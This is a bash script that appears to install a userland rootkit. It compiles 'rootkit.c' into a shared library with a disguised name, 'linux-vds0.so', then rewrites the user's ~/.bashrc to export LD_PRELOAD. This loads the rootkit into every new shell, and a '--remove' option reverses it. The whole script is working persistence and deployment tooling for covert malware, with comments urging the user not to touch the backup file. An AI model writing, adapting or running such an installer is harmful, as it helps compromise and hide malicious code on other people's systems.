#!/bin/bash

GREEN="\e[32m"
GREENBG="\e[1;42m"
RED="\e[0;31m"
RESETCOL="\e[0m"
LIB="/lib/librootkit"
LIBPATH=$(pwd)
BASHRCBACKUP=.bashrc.backup

show_usage () {
    echo -e "USAGE\n\t --export\n\t --remove\n"
    exit 1
}

# verify if arguments are valid
if [ "$#" -eq 0 ]; then 
    echo -e "${RED}No arguments suplied!${RESETCOL}"; show_usage
fi
if [ "$#" -eq 2 ]; then 
    echo -e "${RED}Too many arguments!${RESETCOL}"; show_usage
fi

# compile source
gcc -shared -fPIC -D_GNU_SOURCE -Wall rootkit.c -o linux-vds0.so -ldl

if [ "$@" == "--export" ]; then
    # trust me, do not touch this file .bashrc.backup
    if [ ! -f "$BASHRCBACKUP" ]; then
        cp ~/.bashrc .bashrc.backup
    else
        cat .bashrc.backup > .bashrc.mod; echo "export LD_PRELOAD=$(pwd)/linux-vds0.so" >> .bashrc.mod
        cat .bashrc.mod > ~/.bashrc
        bash && clear
    fi

elif [ "$@" == "--remove" ]; then
    cat .bashrc.backup > .bashrc.mod; echo "unset LD_PRELOAD" >> .bashrc.mod
    cat .bashrc.mod > ~/.bashrc
    rm linux-vds0.so
    bash && clear
fi